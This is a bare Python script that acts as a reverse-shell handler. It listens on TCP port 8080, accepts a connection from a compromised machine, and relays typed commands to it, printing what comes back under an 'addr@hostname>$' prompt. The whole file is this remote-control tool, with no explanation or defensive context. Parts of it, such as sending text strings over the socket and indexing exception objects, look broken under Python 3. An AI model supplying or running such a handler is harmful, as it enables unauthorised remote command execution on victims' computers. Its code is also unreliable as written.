import socket, os, sys
def socketCreate():
    try:
        global host
        global port
        global s
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        host = ''
        port = 8080

    except socket.error as msg:
        print("Socket Creation Error: " + str(msg[0]))
    
def socketBind():
        try:
                print ('Binding Socket at Port %s'%(port))
                s.bind((host, port))
                s.listen(1)
        except socket.error as msg:
                print('Socket Binding Error: ' + str(msg[0]))
                print ('Retrying')

                socketBind()

def socketAccept():
        global conn 
        global addr 
        global hostname 

        try:
                conn, addr = s.accept()
                print ('[!] Session opened at %s:%s' %(addr[0], addr[1]))
                print("")
                hostname = conn.recv(1024)
                menu()
        except socket.error as msg:
                print('Socket Accepting Error:' + str(msg[0]))

def menu():
        while True:
                cmd = input(str(addr[0]) + '@' + str(hostname) + ">$")
                if cmd == 'exit':
                        conn.close()
                        s.close()
                        sys.exit()
                command = conn.send(cmd)
                result = conn.recv(16834)
                if result != hostname:
                        print(result)

def main():
        socketCreate()
        socketBind()
        socketAccept()

main()



        
        



